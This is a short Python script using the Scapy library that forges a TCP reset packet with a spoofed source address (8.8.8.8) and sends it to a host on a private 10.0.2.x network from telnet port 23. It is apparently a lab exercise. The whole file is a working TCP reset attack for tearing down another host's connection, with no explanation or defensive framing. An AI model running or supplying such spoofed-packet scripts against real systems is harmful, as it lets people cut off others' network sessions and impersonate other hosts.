#!/usr/bin/python

from scapy.all import *

ip = IP(src="8.8.8.8", dst="10.0.2.5")
tcp = TCP(sport=23, dport=59790, flags="R")
pkt = ip/tcp
send(pkt, verbose=0)

